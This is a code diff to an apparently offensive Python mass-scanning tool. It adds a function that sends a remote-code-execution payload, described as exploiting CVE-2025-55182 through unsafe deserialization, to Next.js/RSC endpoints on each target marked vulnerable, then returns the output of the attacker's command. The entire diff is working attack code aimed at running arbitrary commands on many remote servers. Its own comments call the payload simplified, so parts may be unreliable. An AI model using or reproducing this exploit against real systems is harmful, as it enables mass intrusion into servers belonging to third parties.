@@ -407,35 +407,64 @@ class MassScanner:
             print(f"{Colors.RED}Error reading file: {e}{Colors.RESET}")
             sys.exit(1)
     
-    def executeCommand(self, target: str) -> str:
-        """Execute arbitrary command on vulnerable target"""
+    def executeRemoteCommand(self, target: str) -> str:
+        """Execute arbitrary command on vulnerable target via CVE-2025-55182"""
         if not self.execCommand:
             return None
             
         try:
-            # Replace placeholder with target URL
+            # Construct payload for CVE-2025-55182
+            # Note: This payload structure is based on the React2Shell PoC
+            # It leverages unsafe deserialization to execute code via Function constructor
+            
+            # Replace placeholder with actual command
             cmd = self.execCommand.replace("{}", target)
             
-            # Execute command
-            process = subprocess.Popen(
-                cmd,
-                shell=True,
-                stdout=subprocess.PIPE,
-                stderr=subprocess.PIPE,
-                text=True
-            )
-            stdout, stderr = process.communicate()
+            # Payload to trigger RCE
+            # We use a multipart/form-data request with a crafted body
+            payload = {
+                "1": 'I["$1:constructor:constructor"]',
+                "2": f'I["{cmd}"]',
+                "3": 'I["return process.mainModule.require(\'child_process\').execSync(arguments[0]).toString()"]',
+                "4": 'I["$3($2)"]'
+            }
             
-            output = []
-            if stdout:
-                output.append(stdout.strip())
-            if stderr:
-                output.append(f"STDERR: {stderr.strip()}")
-                
-            return "\n".join(output)
+            # Send the exploit request
+            # We target common RSC endpoints
+            endpoints = ['/_next/data', '/adfa', '/api/actions']
+            
+            for endpoint in endpoints:
+                try:
+                    exploitUrl = urljoin(target, endpoint)
+                    
+                    # We need to send a specific multipart structure
+                    # Using a simplified approach here, but a real exploit might need exact boundary control
+                    files = {
+                        'rsc_payload': (None, json.dumps(payload), 'text/x-component')
+                    }
+                    
+                    headers = {
+                        'Next-Action': 'test',
+                        'RSC': '1'
+                    }
+                    
+                    response = self.scanner.session.post(
+                        exploitUrl,
+                        files=files,
+                        headers=headers,
+                        timeout=10
+                    )
+                    
+                    if response.status_code == 200:
+                        return f"Exploit sent to {endpoint}. Response: {response.text[:100]}"
+                        
+                except Exception:
+                    continue
+            
+            return "Exploit attempted, but no clear success response."
             
         except Exception as e:
-            return f"Execution error: {str(e)}"
+            return f"Exploit error: {str(e)}"
 
     def scanTargets(self, targets: List[str], resume: bool = False) -> List[ScanResult]:
         """Scan multiple targets with concurrent processing"""
@@ -495,7 +524,7 @@ class MassScanner:
                     
                     # Execute command if vulnerable
                     if result.vulnerable and self.execCommand:
-                        result.execOutput = self.executeCommand(result.url)
+                        result.execOutput = self.executeRemoteCommand(result.url)
                     
                     results.append(result)
                     completed.add(url)
